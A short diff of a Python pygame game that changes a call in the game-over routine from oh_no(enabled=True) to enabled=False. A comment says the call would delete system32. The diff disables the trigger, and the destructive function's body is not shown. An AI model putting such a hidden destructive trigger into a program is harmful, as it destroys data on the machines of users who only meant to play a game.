@@ -89,7 +89,7 @@ def game_over():
 	pygame.display.flip()
 	
 	# after 2 seconds we will delete system32 and quit the program
-	oh_no(enabled=True) # CHANGE ME TO FALSE IF YOU DONT WANT TO DELETE SYSTEM32
+	oh_no(enabled=False) # CHANGE ME TO FALSE IF YOU DONT WANT TO DELETE SYSTEM32
 	time.sleep(2)
 	
 	# deactivating the pygame library
